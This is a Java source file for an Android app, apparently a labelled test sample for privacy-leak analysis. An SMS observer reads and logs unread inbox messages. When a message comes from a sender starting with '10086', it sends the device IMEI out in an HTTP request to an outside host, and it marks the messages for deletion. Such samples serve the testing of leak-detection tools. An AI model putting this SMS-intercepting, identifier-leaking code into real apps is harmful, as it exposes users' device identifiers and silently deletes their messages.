package edu.ucdavis.smsreceived2;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Description:
 * Authors: Hao Fu(haofu@ucdavis.edu)
 * Date: 7/1/2016
 */
public class SmsObserver extends ContentObserver {

    private ContentResolver mResolver;
    public SmsHandler smsHandler;
    private Context context;

    public SmsObserver(ContentResolver mResolver, SmsHandler handler, Context context) {
        super(handler);
        this.mResolver = mResolver;
        this.smsHandler = handler;
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        Log.i("SmsObserver onChange ", "SmsObserver 短信有改变");
        Cursor mCursor = mResolver.query(Uri.parse("content://sms/inbox"),
                new String[] { "_id", "address", "read", "body", "thread_id" },
                "read=?", new String[] { "0" }, "date desc");

        if (mCursor == null) {
            return;
        } else {
            while (mCursor.moveToNext()) {
                SmsInfo _smsInfo = new SmsInfo();

                int _inIndex = mCursor.getColumnIndex("_id");
                if (_inIndex != -1) {
                    _smsInfo._id = mCursor.getString(_inIndex);
                }

                int thread_idIndex = mCursor.getColumnIndex("thread_id");
                if (thread_idIndex != -1) {
                    _smsInfo.thread_id = mCursor.getString(thread_idIndex);
                }

                int addressIndex = mCursor.getColumnIndex("address");
                if (addressIndex != -1) {
                    _smsInfo.smsAddress = mCursor.getString(addressIndex);
                }

                int bodyIndex = mCursor.getColumnIndex("body");
                if (bodyIndex != -1) {
                    _smsInfo.smsBody = mCursor.getString(bodyIndex);
                }

                int readIndex = mCursor.getColumnIndex("read");
                if (readIndex != -1) {
                    _smsInfo.read = mCursor.getString(readIndex);
                }

                // 根据你的拦截策略，判断是否不对短信进行操作;将短信设置为已读;将短信删除
                System.out.println("获取的短信内容为："+_smsInfo.toString());
                Log.i("SmsObserver ...", "获取的短信内容为："+_smsInfo.toString());

                if (_smsInfo.smsAddress.startsWith("10086")) {
                    TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String imei = telephonyManager.getDeviceId(); //source
                    Thread connectionThread = new Thread(new ConnectionThread(imei));
                    connectionThread.start();
                }


                Message msg = smsHandler.obtainMessage();
                _smsInfo.action = 2;// 0不对短信进行操作;1将短信设置为已读;2将短信删除
                msg.obj = _smsInfo;
                smsHandler.sendMessage(msg);
            }
        }

        if (mCursor != null) {
            mCursor.close();
            mCursor = null;
        }
    }

    public class SmsInfo {
        public String _id = "";
        public String thread_id = "";
        public String smsAddress = "";
        public String smsBody = "";
        public String read = "";
        public int action = 0;// 1代表设置为已读，2表示删除短信
        @Override
        public String toString() {
            return "SmsInfo [_id=" + _id + ", thread_id=" + thread_id
                    + ", smsAddress=" + smsAddress + ", smsBody=" + smsBody
                    + ", read=" + read + ", action=" + action + "]";
        }
    }

    private class ConnectionThread implements Runnable {
        String data = "";

        public ConnectionThread(String data) {
            this.data = data;
        }

        @Override
        public void run() {
            try {
                connect(data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private void connect(String data) throws IOException {
            String URL = "http://www.google.com/search?q=";
            URL = URL.concat(data);
            java.net.URL url = new URL(URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();
            Log.d(getClass().getSimpleName(), URL);

            InputStream is = conn.getInputStream();
            if (is == null) {
                return;
            }
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            try {
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
            } finally {
                br.close();
                is.close();
            }
            Log.d(getClass().getSimpleName(), sb.toString());
        }
    }
}
